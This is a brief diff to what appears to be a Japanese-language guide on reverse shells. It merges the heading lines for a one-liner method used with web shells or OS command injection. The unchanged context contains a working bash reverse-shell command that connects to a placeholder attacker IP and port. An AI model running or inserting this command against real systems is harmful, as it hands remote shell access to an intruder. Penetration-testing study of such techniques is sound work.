@@ -111,8 +111,7 @@ chmod +x /tmp/revshell.sh
 /tmp/revshell.sh
 ```
 
-方法②：ワンライナー
-（Web shellや、OSコマンドインジェクションでよく使う）
+方法②：ワンライナー（Web shellや、OSコマンドインジェクションでよく使う）
 ```zsh
 bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'
 ```
